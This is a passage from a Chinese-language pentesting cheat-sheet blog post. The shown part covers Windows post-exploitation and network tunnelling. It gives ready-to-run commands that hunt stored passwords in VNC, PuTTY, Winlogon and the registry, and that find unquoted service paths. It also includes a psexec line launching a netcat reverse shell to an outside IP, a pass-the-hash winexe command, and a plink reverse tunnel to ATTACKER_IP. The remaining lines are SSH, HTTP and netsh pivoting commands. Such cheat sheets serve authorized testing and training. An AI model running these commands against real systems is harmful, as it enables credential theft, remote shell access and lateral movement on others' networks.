dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
dir /s *cred* == *pass* == *.conf

# Windows Autologon
reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;

# VNC
reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;

# Putty
reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;

# Registry
reg query HKLM /f password /t REG_SZ /s 
reg query HKCU /f password /t REG_SZ /s
</code></pre>
<h3 id="检查未注册（引用）的服务"><a href="#检查未注册（引用）的服务" class="headerlink" title="检查未注册（引用）的服务"></a>检查未注册（引用）的服务</h3><pre><code class="shell">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;
wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;
</code></pre>
<h3 id="开启进程"><a href="#开启进程" class="headerlink" title="开启进程"></a>开启进程</h3><h4 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code class="shell"># Requires PSRemoting
$username = &#39;Administrator&#39;;$password = &#39;1234test&#39;;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command &#123; whoami &#125;

# without PSRemoting
cmd&gt; powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;, (ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))

# without PS Remoting, with arguments
cmd&gt; powershell -command &quot;start-process cmd.exe -argumentlist &#39;/c calc&#39; -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;,(ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))&quot;
</code></pre>
<h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><pre><code class="shell"># Requires interactive console
runas /user:userName cmd.exe
</code></pre>
<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><pre><code class="shell">psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
</code></pre>
<h4 id="Pth-WinExe"><a href="#Pth-WinExe" class="headerlink" title="Pth-WinExe"></a>Pth-WinExe</h4><pre><code class="shell">pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
</code></pre>
<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h3><pre><code class="shell"># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that&#39;s being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
</code></pre>
<h3 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h3><pre><code class="shell"># Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
ssh -D 127.0.0.1:8080 user@SSH_SERVER
</code></pre>
<h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><pre><code class="shell"># Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
# Scenario: expose RDP on non-routable network;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
</code></pre>
<h3 id="Proxy-Tunnel"><a href="#Proxy-Tunnel" class="headerlink" title="Proxy Tunnel"></a>Proxy Tunnel</h3><pre><code class="shell"># Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
# Scenario: a remote host has SSH running, but it&#39;s only bound to 127.0.0.1, but you want to reach it;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555
</code></pre>
<h3 id="HTTP隧道-SSH-Over-HTTP"><a href="#HTTP隧道-SSH-Over-HTTP" class="headerlink" title="HTTP隧道: SSH Over HTTP"></a>HTTP隧道: SSH Over HTTP</h3><pre><code class="shell"># Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
hts -F localhost:22 80

# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
htc -F 8080 192.168.1.15:80

# Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22
ssh localhost -p 8080
</code></pre>
<h3 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h3><pre><code class="shell">#添加一个IPV4到IPV4的端口映射
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.75.130  connectport=8080

#指定监听ip和端口可以删除
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4445

#查看存在的转发
netsh interface portproxy show all
</code></pre>
<blockquote>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">Pentesting Cheatsheets</a></p>
</blockquote>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">忘返</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/">https://7mitu.github.io/2020/11/08/渗透测试速查表/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://7mitu.github.io">忘返的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/CheckList/">CheckList</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%A6%E5%AF%9F"><span class="toc-number">1.</span> <span class="toc-text">侦察</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E6%B4%BBIP%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">存活IP扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8FPing"><span class="toc-number">1.2.</span> <span class="toc-text">批量Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E4%B8%AA%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%9F%A5"><span class="toc-number">1.3.</span> <span class="toc-text">单个端口检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%91%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.</span> <span class="toc-text">少量端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.5.</span> <span class="toc-text">nc端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Masscan%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.6.</span> <span class="toc-text">Masscan端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-number">1.7.</span> <span class="toc-text">DNS信息查询&#x2F;子域名爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NFS-Exported-Shares"><span class="toc-number">1.8.</span> <span class="toc-text">NFS Exported Shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.9.</span> <span class="toc-text">Kerberos枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%EF%BC%88%E7%AE%80%E6%98%93%EF%BC%89"><span class="toc-number">1.10.</span> <span class="toc-text">Web漏洞扫描（简易）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RPC-NetBios-SMB%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.11.</span> <span class="toc-text">RPC&#x2F;NetBios&#x2F;SMB探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SNMP%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.12.</span> <span class="toc-text">SNMP探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMTP%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.13.</span> <span class="toc-text">SMTP探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.14.</span> <span class="toc-text">域信息探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell%E4%B8%8B%E7%9A%84%E7%AB%AF%E5%8F%A3%E7%9B%91%E5%90%AC"><span class="toc-number">1.15.</span> <span class="toc-text">Powershell下的端口监听</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">2.</span> <span class="toc-text">反弹Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash"><span class="toc-number">2.1.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl"><span class="toc-number">2.2.</span> <span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">2.3.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">2.4.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-number">2.5.</span> <span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Netcat-without-e"><span class="toc-number">2.6.</span> <span class="toc-text">Netcat without -e</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Telnet-Linux"><span class="toc-number">2.7.</span> <span class="toc-text">Telnet(Linux)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-number">2.8.</span> <span class="toc-text">Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XTerm"><span class="toc-number">2.9.</span> <span class="toc-text">XTerm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E5%8D%87%E7%BA%A7"><span class="toc-number">2.10.</span> <span class="toc-text">非交互式shell升级</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDWP-RCE"><span class="toc-number">3.</span> <span class="toc-text">JDWP RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90"><span class="toc-number">4.</span> <span class="toc-text">木马生成</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-number">4.1.</span> <span class="toc-text">msf生成有效载荷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E7%BC%96%E8%AF%91c%E4%BB%A3%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">Linux下编译c代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E4%B8%8B%E7%BC%96%E8%AF%91%E4%B8%BA-obj"><span class="toc-number">4.3.</span> <span class="toc-text">Windows下编译为.obj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#py%E6%96%87%E4%BB%B6%E8%BD%AC%E6%8D%A2exe"><span class="toc-number">4.4.</span> <span class="toc-text">py文件转换exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%E6%A8%A1%E5%BC%8F%E5%B9%B6%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="toc-number">4.5.</span> <span class="toc-text">生成有效载荷模式并计算偏移量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.</span> <span class="toc-text">WEB文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">5.2.</span> <span class="toc-text">制作图片马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-number">5.3.</span> <span class="toc-text">.htaccess文件配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%8A%E4%BC%A0WebShell"><span class="toc-number">5.4.</span> <span class="toc-text">SQL注入上传WebShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%9A%B4%E7%A0%B4"><span class="toc-number">6.</span> <span class="toc-text">密码暴破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra%E7%A0%B4%E8%A7%A3Web%E6%9C%8D%E5%8A%A1%E5%AF%86%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text">hydra破解Web服务密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra%E7%A0%B4%E8%A7%A3%E9%80%9A%E7%94%A8%E5%8D%8F%E8%AE%AE%E5%8F%A3%E4%BB%A4"><span class="toc-number">6.2.</span> <span class="toc-text">hydra破解通用协议口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hashcat"><span class="toc-number">6.3.</span> <span class="toc-text">hashcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3zip%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81"><span class="toc-number">6.4.</span> <span class="toc-text">破解zip文件密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%8C%96%E6%8E%98"><span class="toc-number">7.</span> <span class="toc-text">本地信息挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E8%AF%BB-%E5%86%99%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">7.1.</span> <span class="toc-text">寻找可读&#x2F;写文件夹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%B7%B2%E5%90%AF%E7%94%A8Powershell%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95"><span class="toc-number">7.2.</span> <span class="toc-text">检查是否已启用Powershell日志记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5WinEvent%E6%97%A5%E5%BF%97%E4%B8%AD%E6%98%AF%E5%90%A6%E6%9C%89SecureString"><span class="toc-number">7.3.</span> <span class="toc-text">检查WinEvent日志中是否有SecureString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5WinEvent%E7%9A%84%E6%9C%BA%E5%99%A8%E5%94%A4%E9%86%92-%E7%9D%A1%E7%9C%A0%E6%97%B6%E9%97%B4"><span class="toc-number">7.4.</span> <span class="toc-text">检查WinEvent的机器唤醒&#x2F;睡眠时间</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">8.</span> <span class="toc-text">文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TFTP"><span class="toc-number">8.1.</span> <span class="toc-text">TFTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP"><span class="toc-number">8.2.</span> <span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CertUtil"><span class="toc-number">8.3.</span> <span class="toc-text">CertUtil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-1"><span class="toc-number">8.4.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell"><span class="toc-number">8.5.</span> <span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VBScript"><span class="toc-number">8.6.</span> <span class="toc-text">VBScript</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">8.7.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetCat"><span class="toc-number">8.8.</span> <span class="toc-text">NetCat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E2%80%9Cdebug-exe%E2%80%9D-Method"><span class="toc-number">8.9.</span> <span class="toc-text">Windows “debug.exe” Method</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-BitsAdmin"><span class="toc-number">8.10.</span> <span class="toc-text">Windows BitsAdmin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">9.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">9.1.</span> <span class="toc-text">利用服务进行持久化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8"><span class="toc-number">9.2.</span> <span class="toc-text">创建持久化后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84"><span class="toc-number">9.3.</span> <span class="toc-text">创建用户并添加到本地管理员组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7"><span class="toc-number">9.4.</span> <span class="toc-text">隐藏用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">9.5.</span> <span class="toc-text">利用服务配置错误进行提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E6%9F%A5%E6%89%BE%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">9.6.</span> <span class="toc-text">递归查找隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90"><span class="toc-number">9.7.</span> <span class="toc-text">检查文件&#x2F;目录权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5Windows%E5%AD%98%E5%82%A8%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">9.8.</span> <span class="toc-text">检查Windows存储的凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%9C%AA%E6%B3%A8%E5%86%8C%EF%BC%88%E5%BC%95%E7%94%A8%EF%BC%89%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">9.9.</span> <span class="toc-text">检查未注册（引用）的服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E8%BF%9B%E7%A8%8B"><span class="toc-number">9.10.</span> <span class="toc-text">开启进程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell-1"><span class="toc-number">9.10.1.</span> <span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cmd"><span class="toc-number">9.10.2.</span> <span class="toc-text">cmd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec"><span class="toc-number">9.10.3.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pth-WinExe"><span class="toc-number">9.10.4.</span> <span class="toc-text">Pth-WinExe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">10.</span> <span class="toc-text">内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">10.1.</span> <span class="toc-text">SSH本地端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">10.2.</span> <span class="toc-text">SSH动态端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">10.3.</span> <span class="toc-text">SSH远程端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proxy-Tunnel"><span class="toc-number">10.4.</span> <span class="toc-text">Proxy Tunnel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E9%9A%A7%E9%81%93-SSH-Over-HTTP"><span class="toc-number">10.5.</span> <span class="toc-text">HTTP隧道: SSH Over HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netsh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">10.6.</span> <span class="toc-text">netsh端口转发</span></a></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/">&lt; 避开Windows API执行Shellcode</a></div></section><footer><p>Copyright © 2016 - 2023 <a href="/." rel="nofollow">忘返</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>